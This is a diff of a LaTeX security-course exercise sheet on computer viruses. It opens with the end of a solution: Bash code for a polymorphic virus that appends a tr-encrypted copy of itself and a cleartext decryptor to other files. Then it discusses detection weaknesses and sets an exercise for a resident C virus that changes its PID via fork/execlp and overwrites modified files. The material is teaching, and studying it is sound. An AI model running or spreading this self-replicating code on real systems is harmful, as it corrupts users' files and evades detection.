+	    t=$(echo $t  |  tr ["$tab1"] ["$tab0"])
+	    i=$(($i+1))
+	done
+        #We overwrite with the restoration code
+	#echo "#!/bin/bash " > $file
+	echo "tab0=\"$tab0\"" >> $file
+	echo "tab1=\"$t\"" >> $file
+	echo 'echo "#!/bin/bash " > .temp1.sh' >> $file
+	echo 'echo "tab0=\"$tab0\"" >> .temp1.sh' >> $file
+	echo 'echo "tab1=\"$tab1\"" >> .temp1.sh' >> $file
+	echo 'echo "name=\"$0\"" >> .temp1.sh' >> $file
+	echo 'tail -n 28 $0 | tr  ["$tab0"] ["$tab1"] >> .temp1.sh' >> $file
+	echo 'chmod u+x .temp1.sh' >> $file
+	echo './.temp1.sh' >> $file
+	echo 'exit 0' >> $file
+        echo "$t"
+	tail -n 28  $0 | tr  ["$t"] ["$tab0"] >> $file
+    fi
+done
+\end{lstlisting}
+
+\begin{attention}[title={Re-infection}]
+The virus has no mechanism to check whether a file is already infected. It will add its code on every execution, increasing the file size indefinitely. This is an easily detectable indicator of compromise.
+\end{attention}
+
+\item The problem is managing re-infection; a possible technique is to insert a marker in the encrypted part.
+\end{enumerate}
+
+\begin{pointcle}
+\begin{itemize}
+    \item The \texttt{tr} command performs character-by-character substitution, ideal for implementing monoalphabetic encryption in Bash.
+    \item \textbf{Polymorphism} makes each copy of the virus different in binary, preventing signature-based detection of the encrypted viral code.
+    \item The \textbf{random key} based on \texttt{\$\$} (process PID) varies with each execution, generating a different substitution for each infection.
+    \item The decryptor remains \textbf{in cleartext}: this is the Achilles' heel of the interpreted polymorphic virus, exploitable by antivirus software.
+    \item \textbf{Re-infection} (re-infecting an already infected file) is a classic problem solved by adding a marker.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% SECTION 3: Resident Virus in C
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\section{Resident Virus in C}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% EXERCISE 6: Resident Virus in C
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{exercice} We will implement some features of a resident virus.
+\begin{enumerate}
+\item Write a C program that regularly refreshes its code, effectively changing its PID. You may use the following functions
+\begin{lstlisting}[language=C,numbers=none]
+  pid_t fork();
+  int execlp(const char * application, const char * arg, ... );
+  sleep(int sec);
+\end{lstlisting}
+\item (Optional) Based on the code from question 1, implement a resident virus that monitors the files in a directory, and if one of the files is modified, overwrites it with its own code. (Hint: use functions from \texttt{time.h}, \texttt{readdir} to traverse a directory, and \texttt{stat} to retrieve file information).
+\end{enumerate}
+\end{exercice}
+
+% --- Course reminder ---
+\begin{rappel}
+\textbf{Unix processes and resident viruses:}
+
+A \textbf{resident virus} stays active in memory after the host program has finished executing. In C under Unix, this is implemented using process management primitives.
+
+\medskip
+\textbf{Key POSIX functions:}
+
+\begin{center}
+\begin{tabular}{lp{8cm}}
+\toprule
+\textbf{Function} & \textbf{Description} \\
+\midrule
+\texttt{fork()} & Creates a child process identical to the parent. Returns 0 in the child, the child's PID in the parent, -1 on error. \\
+\texttt{execlp(app, arg, ...)} & Replaces the current process with the program \texttt{app}. The process keeps the same PID. \\
+\texttt{sleep(sec)} & Suspends execution for \texttt{sec} seconds. \\
+\texttt{getpid()} & Returns the PID of the current process. \\
+\texttt{readdir()} & Reads entries from an opened directory. \\
+\texttt{stat()} & Retrieves file metadata (size, dates, permissions). \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\medskip
+\textbf{Refreshing principle:} the virus performs a \texttt{fork()} followed by an \texttt{execlp()} of itself, which creates a new process with a new PID. The parent process terminates, making PID-based detection more difficult. A \texttt{sleep()} between each cycle reduces CPU consumption and makes the virus more stealthy.
+\end{rappel}
+
+
+\end{document}
